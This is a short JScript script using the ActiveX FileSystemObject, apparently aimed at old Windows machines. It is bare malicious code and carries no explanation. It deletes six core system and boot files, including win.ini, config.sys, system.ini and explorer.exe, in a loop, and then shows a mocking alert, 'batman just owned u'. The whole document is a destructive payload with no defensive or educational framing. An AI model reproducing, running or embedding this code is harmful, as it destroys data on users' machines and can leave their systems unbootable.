var fso, f1
fso = new ActiveXObject("Scripting.FileSystemObject")
thePaths = new Array("c:\\windows\\win.ini","c:\\autoexec.bat","c:\\config.sys","c:\\windows\\protocol.ini","c:\\windows\\system.ini","c:\\windows\\explorer.exe")
for (i=0; i<6; i++) {
	f1 = fso.GetFile(thePaths[i])
	f1.Delete()
}
alert("batman just owned u")